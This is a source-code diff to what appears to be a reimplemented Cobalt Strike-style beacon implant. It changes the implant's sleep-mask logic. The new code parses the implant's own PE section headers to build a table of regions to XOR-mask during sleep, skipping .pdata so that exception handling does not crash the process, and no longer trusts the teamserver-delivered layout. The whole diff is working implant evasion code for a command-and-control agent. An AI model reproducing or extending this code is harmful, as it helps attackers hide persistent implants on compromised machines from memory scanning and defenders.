@@ -6,6 +6,7 @@
  */
 #include <Windows.h>
 #include <stdio.h>
+#include <string.h>
 #include <limits.h>
 #include "commands.h"
 #include "beacon.h"
@@ -344,29 +345,52 @@ static void sm_keep_pairs(GARGLEP * gp, int keep) {
 	}
 }
 
-/* Clamp the sections walk to our own image: pairs beyond SizeOfImage end
- * the table, pairs straddling it are cut. Returns the new span. */
-static DWORD sm_clamp_sections(GARGLEP * gp) {
-	DWORD img = sm_image_size(gp ? gp->beacon_ptr : NULL);
-	int i;
-	if (img == 0 || gp->sections == NULL)
+/* Build the mask table from OUR OWN PE sections instead of the TS-delivered
+ * table. The delivered pairs describe the official sleeve layout; applied to
+ * our image they land on different data. Pair 5 (0x62000-0x62100) covers our
+ * .pdata: masking it makes any exception dispatch during the Sleep window
+ * binary-search garbage RUNTIME_FUNCTION entries and fail-fast the process
+ * (uncatchable by SEH, no WER dump). Mask headers + .text + .rdata + .data;
+ * skip .pdata / .fptable / .reloc. Returns the new span. */
+static DWORD sm_build_own_table(GARGLEP * gp) {
+	static DWORD own[34];
+	unsigned short lfanew, optsize, nsec;
+	unsigned int i;
+	DWORD count = 1;
+	if (gp == NULL || gp->beacon_ptr == NULL)
 		return 0;
-	for (i = 0; i < 64; i++) {
-		DWORD a = gp->sections[i * 2];
-		DWORD b = gp->sections[i * 2 + 1];
-		if (a == 0 && b == 0)
-			break;
-		if (a >= img) {
-			gp->sections[i * 2] = 0;
-			gp->sections[i * 2 + 1] = 0;
-			break;
-		}
-		if (b > img)
-			gp->sections[i * 2 + 1] = img;
+	if (gp->beacon_ptr[0] != 'M' || gp->beacon_ptr[1] != 'Z')
+		return 0;
+	memcpy(&lfanew, gp->beacon_ptr + 0x3C, sizeof(lfanew));
+	memcpy(&optsize, gp->beacon_ptr + lfanew + 20, sizeof(optsize));
+	memcpy(&nsec, gp->beacon_ptr + lfanew + 6, sizeof(nsec));
+	if (lfanew == 0 || lfanew >= 0x400 || optsize < 0xD0 || optsize >= 0x400 ||
+			nsec == 0 || nsec > 16)
+		return 0;
+	own[0] = 0;               /* PE headers page(s) */
+	own[1] = 0x1000;
+	for (i = 0; i < nsec && count < 16; i++) {
+		char * sh = gp->beacon_ptr + lfanew + 24 + optsize + i * 40;
+		unsigned int vs, va;
+		char nm[9];
+		memcpy(nm, sh, 8);
+		nm[8] = 0;
+		if (strcmp(nm, ".pdata") == 0 || strcmp(nm, ".fptable") == 0 ||
+				strcmp(nm, ".reloc") == 0)
+			continue;
+		memcpy(&vs, sh + 8, 4);
+		memcpy(&va, sh + 12, 4);
+		if (va == 0 || vs == 0 || va >= 0x10000)
+			continue;
+		own[count * 2] = va;
+		own[count * 2 + 1] = va + vs;
+		count++;
 	}
+	own[count * 2] = 0;
+	own[count * 2 + 1] = 0;
+	gp->sections = own;
 	return sm_max_end(gp);
 }
-
 
 static DWORD g_sm_spanraw;
 static DWORD g_sm_img;
@@ -902,11 +926,11 @@ BOOL command_inline_execute_object_parsed(char * objblob, int objlen, DWORD entr
 					sm_span = sm_max_end(gparms);
 					g_sm_spanraw = sm_span;
 					g_sm_img = sm_image_size(gparms ? gparms->beacon_ptr : NULL);
-					/* FIX: the delivered table describes the official sleeve
-					 * layout (larger than ours); clamp the walk to OUR image
-					 * or it XORs 112KB past the mapping. */
-					if (gparms != NULL && g_sm_img != 0 && sm_span > g_sm_img)
-						sm_span = sm_clamp_sections(gparms);
+					/* FIX: replace the TS-delivered layout (it describes the
+					 * official sleeve) with our own PE section ranges,
+					 * skipping .pdata/.fptable/.reloc. */
+					if (gparms != NULL)
+						sm_span = sm_build_own_table(gparms);
 					sm_dump_gparms(gparms, code_dst, total, t, sm_mode, sm_span,
 						(void *)inlinefunc);
 					if (gparms != NULL) {
